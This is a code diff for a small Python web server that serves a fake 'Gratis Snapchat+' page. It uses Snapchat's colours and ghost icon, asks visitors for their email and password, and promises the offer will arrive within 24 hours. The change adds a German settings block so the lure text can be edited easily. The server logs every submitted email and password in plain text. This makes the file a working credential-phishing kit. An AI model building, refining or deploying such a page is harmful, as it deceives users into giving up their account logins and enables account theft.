@@ -1,25 +1,67 @@
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
-import urllib.parse
+import html as html_lib
+import json
 import os
+import urllib.parse
 
-# r""" ... """ (raw string), damit die Backslashes im JavaScript unverändert bleiben
-HTML = r"""<!DOCTYPE html>
+# =====================================================================
+#  EINSTELLUNGEN - HIER KANNST DU ALLES ÄNDERN
+#  Ändere nur den Text rechts vom Doppelpunkt (zwischen den "").
+# =====================================================================
+SETTINGS = {
+    # --- Titel & Überschriften ---
+    "PAGE_TITLE": "GratisSnapchat+",                 # Titel im Browser-Tab
+    "HEADLINE": "Gratis Snapchat+",                   # Große Überschrift auf der Seite
+    "SUBTITLE": "send your username/message",    # Text unter der Überschrift
+
+    # --- Felder ---
+    "USERNAME_LABEL": "E-Mail",                # Beschriftung über dem Namensfeld
+    "USERNAME_PLACEHOLDER": "E-Mail",          # Grauer Text im Namensfeld
+    "MESSAGE_LABEL": "Passwort",                  # Beschriftung über dem Nachrichtenfeld
+    "MESSAGE_PLACEHOLDER": "Passwort",            # Grauer Text im Nachrichtenfeld
+
+    # --- Buttons ---
+    "SEND_BUTTON": "Send",                       # Text auf dem Senden-Button
+    "SENDING_BUTTON": "Sending…",                # Text während des Sendens
+    "SEND_ANOTHER_BUTTON": "Send another",       # Button nach dem Senden
+
+    # --- Meldungen ---
+    "SUCCESS_TITLE": "Sent!",                    # Überschrift nach dem Senden
+    "SUCCESS_TEXT": "✅ Innerhalb von 24 Stunden wird es ankommen😄",
+    "ERROR_TEXT": "❌ Error – check your connection and try again.",
+
+    # --- Sonstiges ---
+    "FOOTER": "powered by Python",               # Kleiner Text ganz unten
+    "FAVICON_EMOJI": "👻",                       # Symbol im Browser-Tab
+    "MAX_USERNAME_LENGTH": 60,                   # Maximale Zeichen beim Namen
+    "MAX_MESSAGE_LENGTH": 300,                   # Maximale Zeichen bei der Nachricht
+
+    # --- Farben (Hex-Code) ---
+    "BACKGROUND_COLOR": "#FFFC00",               # Hintergrund (Snapchat-Gelb)
+    "BUTTON_COLOR": "#0EADFF",                   # Farbe des Senden-Buttons
+}
+# =====================================================================
+#  AB HIER MUSST DU NICHTS MEHR ÄNDERN
+# =====================================================================
+
+S = SETTINGS
+
+TEMPLATE = r"""<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<title>Gratis Snapchat+</title>
+<title>%%PAGE_TITLE%%</title>
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<meta name="theme-color" content="#FFFC00">
-<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' rx='22' fill='%23FFFC00'/%3E%3Ctext x='50' y='72' font-size='60' text-anchor='middle'%3E%F0%9F%91%BB%3C/text%3E%3C/svg%3E">
+<meta name="theme-color" content="%%BACKGROUND_COLOR%%">
+<link rel="icon" href="%%FAVICON%%">
 
 <style>
 :root{
-  --yellow:#FFFC00;
+  --yellow:%%BACKGROUND_COLOR%%;
+  --blue:%%BUTTON_COLOR%%;
   --ink:#16191C;
   --muted:#6B7280;
   --field:#F1F2F4;
-  --blue:#0EADFF;
-  --blue-dark:#0A94DE;
   --green:#18C964;
   --red:#FF3B5C;
   --safe-t:env(safe-area-inset-top,0px);
@@ -35,7 +77,6 @@ body{
   -webkit-font-smoothing:antialiased;
   overflow-x:hidden;
 }
-
 .stage{
   min-height:100%;
   min-height:100dvh;
@@ -80,7 +121,6 @@ h1{
   font-weight:500;
   color:rgba(22,25,28,.7);
 }
-
 .sheet{
   width:100%;
   max-width:520px;
@@ -99,11 +139,9 @@ h1{
 .grab{
   width:42px;height:5px;border-radius:5px;background:#E3E5E8;margin:-14px auto 22px;
 }
-
 .field{margin-bottom:16px}
 .field label{
-  display:flex;
-  justify-content:space-between;
+  display:block;
   font-size:13px;
   font-weight:700;
   color:var(--muted);
@@ -128,9 +166,8 @@ h1{
 .field input:focus,.field textarea:focus{
   background:#fff;
   border-color:var(--blue);
-  box-shadow:0 0 0 4px rgba(14,173,255,.18);
+  box-shadow:0 0 0 4px color-mix(in srgb,var(--blue) 20%,transparent);
 }
-
 .btn{
   width:100%;
   border:0;
@@ -146,15 +183,16 @@ h1{
   align-items:center;
   justify-content:center;
   gap:10px;
-  transition:transform .12s,background .15s,box-shadow .15s,opacity .15s;
-  box-shadow:0 8px 20px rgba(14,173,255,.35);
+  transition:transform .12s,filter .15s,box-shadow .15s;
+  box-shadow:0 8px 20px color-mix(in srgb,var(--blue) 40%,transparent);
 }
-.btn:hover{background:var(--blue-dark)}
+.btn:hover{filter:brightness(.93)}
 .btn:active{transform:scale(.97)}
 .btn:disabled{
   background:#D5D9DE;
   box-shadow:none;
   cursor:not-allowed;
+  filter:none;
   color:#fff;
 }
 .btn.ghost-btn{
@@ -162,9 +200,8 @@ h1{
   color:var(--ink);
   box-shadow:none;
 }
-.btn.ghost-btn:hover{background:#E6E8EB}
+.btn.ghost-btn:hover{background:#E6E8EB;filter:none}
 .btn:focus-visible{outline:3px solid var(--ink);outline-offset:2px}
-
 .spin{
   width:20px;height:20px;border-radius:50%;
   border:3px solid rgba(255,255,255,.4);
@@ -174,7 +211,6 @@ h1{
 }
 .sending .spin{display:block}
 @keyframes spin{to{transform:rotate(360deg)}}
-
 #error{
   min-height:20px;
   margin:12px 4px 0;
@@ -183,7 +219,6 @@ h1{
   color:var(--red);
   text-align:center;
 }
-
 .done{display:none;text-align:center;padding:6px 0 4px}
 .sent .done{display:block;animation:pop .45s cubic-bezier(.2,1.4,.4,1) both}
 .sent form{display:none}
@@ -202,7 +237,6 @@ h1{
 @keyframes draw{to{stroke-dashoffset:0}}
 .done h2{margin:0 0 6px;font-size:24px;letter-spacing:-.02em}
 .done p{margin:0 0 22px;color:var(--muted);font-size:16px;line-height:1.4}
-
 .footer{
   margin-top:18px;
   text-align:center;
@@ -210,7 +244,6 @@ h1{
   font-weight:600;
   color:#A3A8B0;
 }
-
 @media (min-width:700px){
   .stage{justify-content:center;padding:32px}
   .hero{flex:0;padding:0 0 28px}
@@ -238,8 +271,8 @@ h1{
       <circle cx="48" cy="46" r="4.5" fill="#16191C"/>
       <circle cx="72" cy="46" r="4.5" fill="#16191C"/>
     </svg>
-    <h1>Buraya Koy+</h1>
-    <p class="subtitle">send your E-Mail/Passwort</p>
+    <h1>%%HEADLINE%%</h1>
+    <p class="subtitle">%%SUBTITLE%%</p>
   </header>
 
   <section class="sheet" id="sheet">
@@ -247,19 +280,19 @@ h1{
 
     <form id="form" autocomplete="off" novalidate>
       <div class="field">
-        <label for="user">E-Mail</label>
-        <input id="user" name="user" placeholder="Passwort" maxlength="60"
+        <label for="user">%%USERNAME_LABEL%%</label>
+        <input id="user" name="user" placeholder="%%USERNAME_PLACEHOLDER%%" maxlength="%%MAX_USERNAME_LENGTH%%"
                autocapitalize="none" autocorrect="off" spellcheck="false">
       </div>
 
       <div class="field">
-        <label for="word">Message <span id="count">0/300</span></label>
-        <textarea id="word" name="word" placeholder="E-Mail" maxlength="300"></textarea>
+        <label for="word">%%MESSAGE_LABEL%%</label>
+        <textarea id="word" name="word" placeholder="%%MESSAGE_PLACEHOLDER%%" maxlength="%%MAX_MESSAGE_LENGTH%%"></textarea>
       </div>
 
       <button class="btn" id="send" type="submit" disabled>
         <span class="spin"></span>
-        <span id="sendText">Send</span>
+        <span id="sendText">%%SEND_BUTTON%%</span>
       </button>
       <div id="error" role="alert"></div>
     </form>
@@ -270,17 +303,19 @@ h1{
           <path d="M5 12.5l4.5 4.5L19 7.5"/>
         </svg>
       </div>
-      <h2>Sent!</h2>
-      <p>✅ Innerhalb von 24 Stunden wird es ankommen😄</p>
-      <button class="btn ghost-btn" id="again" type="button">Send another</button>
+      <h2>%%SUCCESS_TITLE%%</h2>
+      <p>%%SUCCESS_TEXT%%</p>
+      <button class="btn ghost-btn" id="again" type="button">%%SEND_ANOTHER_BUTTON%%</button>
     </div>
 
-    <div class="footer">powered by Snapchat</div>
+    <div class="footer">%%FOOTER%%</div>
   </section>
 
 </main>
 
 <script>
+var T = %%JS_TEXTS%%;
+
 (function(){
   var stage = document.getElementById("stage");
   var form = document.getElementById("form");
@@ -288,12 +323,10 @@ h1{
   var word = document.getElementById("word");
   var send = document.getElementById("send");
   var sendText = document.getElementById("sendText");
-  var count = document.getElementById("count");
   var error = document.getElementById("error");
   var again = document.getElementById("again");
 
   function update(){
-    count.textContent = word.value.length + "/300";
     send.disabled = !(user.value.trim() && word.value.trim());
   }
   user.addEventListener("input", update);
@@ -316,7 +349,7 @@ h1{
     error.textContent = "";
     send.disabled = true;
     stage.classList.add("sending");
-    sendText.textContent = "Sending…";
+    sendText.textContent = T.sending;
 
     fetch("/word", {
       method: "POST",
@@ -331,11 +364,11 @@ h1{
       word.value = "";
     })
     .catch(function(){
-      error.textContent = "❌ Error – check your connection and try again.";
+      error.textContent = T.error;
     })
     .then(function(){
       stage.classList.remove("sending");
-      sendText.textContent = "Send";
+      sendText.textContent = T.send;
       update();
     });
   }
@@ -352,7 +385,38 @@ h1{
 </html>
 """
 
-PAGE = HTML.encode("utf-8")
+
+def build_page():
+    page = TEMPLATE
+
+    favicon_svg = (
+        "<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'>"
+        "<rect width='100' height='100' rx='22' fill='" + str(S["BACKGROUND_COLOR"]) + "'/>"
+        "<text x='50' y='72' font-size='60' text-anchor='middle'>"
+        + str(S["FAVICON_EMOJI"]) + "</text></svg>"
+    )
+    values = dict(S)
+    values["FAVICON"] = "data:image/svg+xml," + urllib.parse.quote(favicon_svg)
+
+    js_texts = json.dumps(
+        {
+            "send": S["SEND_BUTTON"],
+            "sending": S["SENDING_BUTTON"],
+            "error": S["ERROR_TEXT"],
+        },
+        ensure_ascii=False,
+    ).replace("</", "<\\/")
+
+    for key, value in values.items():
+        page = page.replace("%%" + key + "%%", html_lib.escape(str(value), quote=True))
+    page = page.replace("%%JS_TEXTS%%", js_texts)
+
+    if "%%" in page:
+        raise SystemExit("Fehler: Ein Platzhalter wurde nicht ersetzt.")
+    return page.encode("utf-8")
+
+
+PAGE = build_page()
 
 
 class Handler(BaseHTTPRequestHandler):
@@ -386,11 +450,11 @@ class Handler(BaseHTTPRequestHandler):
         data = self.rfile.read(length).decode("utf-8", errors="replace")
         info = urllib.parse.parse_qs(data)
 
-        username = info.get("user", [""])[0][:60]
-        message = info.get("word", [""])[0][:300]
+        username = info.get("user", [""])[0][: int(S["MAX_USERNAME_LENGTH"])]
+        message = info.get("word", [""])[0][: int(S["MAX_MESSAGE_LENGTH"])]
 
         # Erscheint im Render-Tab "Logs"
-        print(f"NEW MESSAGE -> {E-Mail}: {Passwort}", flush=True)
+        print(f"NEW MESSAGE -> {username}: {message}", flush=True)
 
         self._send(200, b"OK")
 
